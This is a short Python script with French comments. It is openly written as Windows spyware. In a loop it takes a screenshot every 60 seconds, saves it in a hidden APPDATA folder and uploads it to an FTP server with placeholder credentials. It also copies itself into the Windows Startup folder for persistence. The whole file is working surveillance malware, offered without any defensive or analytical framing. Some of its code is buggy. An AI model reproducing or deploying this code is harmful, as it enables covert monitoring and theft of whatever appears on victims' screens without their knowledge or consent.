import os
import datetime
import pyautogui
import time
import ftplib
from pathlib import Path
import winshell
import sys
import getpass
import shutil


#détecter le path du dossier appdata sur la machine
appdata = os.getenv('APPDATA')
#détecter le path du dossier startup sur la machine (ne fonctionnait simplement pas avec la lib os je peux aussi simplement récupérer le nom de l'utilisateur et l'ajouter dans le path mais bref)
startup = winshell.startup()

script_location = os.path.split(os.path.realpath(sys.argv[0]))[0]
USER_NAME = getpass.getuser()
filename = os.path.splitext(os.path.basename(__file__))[0]

#créer un dossier jul dans le appdata de la machine
dirName = f'{appdata}/jul'
try:
    os.makedirs(dirName)
except FileExistsError:
    print("pd")

def jul():
    while True:
        #récupérer la date + l'heure actuelle
        screenmtn = datetime.datetime.now()
        #placer la date et l'heure sous une forme de vrai date sa mère
        date = screenmtn.strftime("%m-%d-%Y %H-%M-%S")
        
        #prendre un screenshoot sur la machine
        screen = pyautogui.screenshot()
        #save le screenshoot dans le dossier
        screen.save(rf'{appdata}\jul\%s.png' % date)
        
        #path de l'image
        jul = Path(rf'{appdata}\jul\%s.png' % date)
        
        #Connexion ftp blablabla upload du fichier
        session = ftplib.FTP('serveur','user','password')
        
        file = open(jul,'rb')
        session.storbinary(f'STOR {jul.name}', file)
        file.close()
        session.quit()
        #attendre 60 secondes avant de répeter la tache ducoup
        time.sleep(60)

#ajout du programme dans le dossier startup de windows (persistence)
def startup(file_path=rf"{script_location}\%s" % filename):
    startuppath = f'{startup}'
    if Path(f'{startup}\%s' % filename).is_file():
        jul()
        return
    else:
        shutil.move(file_path, startuppath)
        time.sleep(30)
        os.startfile(f"{startuppath}\%s" % filename)

startup()
